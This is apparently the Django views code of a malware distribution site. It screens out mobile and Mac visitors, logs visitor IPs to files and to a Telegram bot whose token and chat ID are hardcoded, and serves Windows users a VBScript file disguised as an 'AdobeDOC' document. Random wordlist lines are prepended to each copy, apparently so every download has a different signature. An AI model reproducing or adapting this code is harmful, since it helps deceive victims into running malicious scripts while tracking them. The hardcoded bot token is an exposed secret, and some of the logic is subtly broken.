import random
import uuid
import requests
import os
from django.shortcuts import redirect, render
from django.http import FileResponse
from .forms import CaptchaTestForm
from django.contrib import messages

# DECLARE CONSTANTS
TELEGRAM_TOKEN = '6692059577:AAH-8s92yLsB94qHVKIZtxPtfEEH5SFJkOg'
TELEGRAM_CHAT_ID = '-980609073'

MAC_USER_AGENT = [
    'Macintosh',
    'Mac OS X',
    'Mac_PowerPC',
]

# Function to check if ip exist in a file already
def search_str(file_path, word):
    with open(file_path, 'r') as file:
        # read all content of a file
        content = file.read()
        # check if string present in a file
        if word in content:
            return True
        else:
            False

# Function to check for ip
def get_ip(request):
    # Get the IP of the  device and log into the  file
    x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
    if x_forwarded_for:
        ip = x_forwarded_for.split(',')[0]
    else:
        ip = request.META.get('REMOTE_ADDR')
    return ip

# Function to Send telegram notification
def telegram_notification(message):
    message = message

    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
   
    params = {
       "chat_id": TELEGRAM_CHAT_ID,
       "text": message,
       
    }
    resp = requests.post(url, params=params)

    # Throw an exception if Telegram API fails
    resp.raise_for_status()


# Function that handles  mobile visits
def mobile_visit(request):
    # Get the IP of the bot device and log into the bot.txt file
    ip = get_ip(request)
    # Log the mobile ip address 
    if search_str('text_logs/mobiles.txt', ip):
        messages.info(request, 'Your Device is not Compatible, Ensure you are using a windows device')
        return redirect('home')
    else:
        with open('text_logs/mobiles.txt', 'a') as file:
            file.write(f'{ip} /n ')

    # Send telegram notification of mobile visit

    message = f'Visit from Mobile \n ip: {ip} \n Device: Mobile'

    telegram_notification(message)

    

    return redirect('home')

# Function that handles  mac visits
def mac_visit(request):
    # Get the IP of the mac device and log into the bot.txt file
    ip = get_ip(request)
    # Log the mac ip address 
    if search_str('text_logs/macs.txt', ip):
        messages.info(request, 'Your Device is not Compatible, Ensure you are using a windows device')
        return redirect('home')
    else:
        with open('text_logs/macs.txt', 'a') as file:
            file.write(f'{ip} /n ')

    # Send telegram notification of mobile visit

    message = f'Visit from Mac \n ip: {ip} \n Device: Mac'

    telegram_notification(message)

    return redirect('home')


def home(request):
    device_type = ""
    os_type = ""
    if request.user_agent.is_mobile:
        device_type = "Mobile"
    if request.user_agent.is_tablet:
        device_type = "Tablet"
    if request.user_agent.is_pc:
        device_type = "PC"
    
    os_type = request.user_agent.os.family
    
    # Check if user is on a mobile device or tablet
    if device_type == "Mobile" or device_type == "Tablet":
        return redirect('mobile_visit')
    
    # Check if user is on a mac
    if os_type in MAC_USER_AGENT:
        return redirect('mac_visit')

    
    if request.method=="POST":
      form=CaptchaTestForm(request.POST)
      if form.is_valid():
         return redirect('download')
      else:
         print("fail")
    form=CaptchaTestForm()
    return render(request,"home.html",{"form":form})


def download_file(request):
    # Get the IP device trying to download
    ip = get_ip(request)
    
    if search_str('text_logs/ip.txt', ip):
        messages.info(request, 'File Downloaded Already!! Check your Download Folder')
        return redirect('home')
    else:
        with open('text_logs/ip.txt', 'a') as file:
            file.write(f'{ip} /n ')

        # Send download notification to telegram
        
        message = f'New Download \n ip: {ip}'

        telegram_notification(message)

        # Prepare the download
        # copy contents of the wordlist.txt
        choicefile=open("wordlist.txt","r")

        # initialize the list to hold the contents of the wordlist
        linelist=[] 

        for line in choicefile:
            linelist.append(line)

        # shuffle the elements of the list
        random.shuffle(linelist)

        # loop through the shufled list elements and write to the test file
        for i in range(8):
            with open("test.txt", "a") as f:
                f.write(linelist[i])

        # Set the file name prefix
        prefix = 'AdobeDOC'

        # Set File ID and name
        file_id = str(uuid.uuid4().fields[-1])[:5]

        file_name = str(prefix) + file_id + '.vbs'

        # provide content to the newly created file
        with open("test.txt", "r") as file:
            for line in file:
                data = file.read()
            with open("copy.vbs", "r+") as doc:
                lines = doc.readlines()
                with open(file_name, "w") as n:
                    n.seek(0)
                    n.write(data)
                    for line in lines:
                        n.write(line)
                    
        
        with open("test.txt",'r+') as file:
            file.truncate(0)

    return FileResponse(open(file_name, 'rb'), as_attachment=True)
    
    
                